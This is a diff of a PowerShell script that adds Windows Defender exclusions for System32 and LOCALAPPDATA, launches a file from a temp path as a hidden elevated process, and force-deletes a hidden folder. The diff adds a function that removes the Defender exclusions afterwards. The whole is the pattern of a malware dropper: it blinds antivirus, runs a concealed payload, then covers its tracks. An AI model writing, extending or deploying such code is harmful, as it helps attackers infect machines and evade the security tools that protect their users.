@@ -19,6 +19,13 @@ function Add-Exclusion {
     } catch {}
 }
 
+function Remove-Exclusion {
+    param ([string]$Path)
+    try {
+        Remove-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
+    } catch {}
+}
+
 Add-Exclusion -Path "C:\Windows\System32"
 Add-Exclusion -Path $env:LOCALAPPDATA
 
@@ -34,6 +41,8 @@ try {
     Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb $runAs -Wait
     Start-Sleep -Seconds 5
     Remove-Item $hiddenFolder -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Exclusion -Path $tempPath
+    Remove-Exclusion -Path $env:LOCALAPPDATA
 }
 catch {
     exit 1
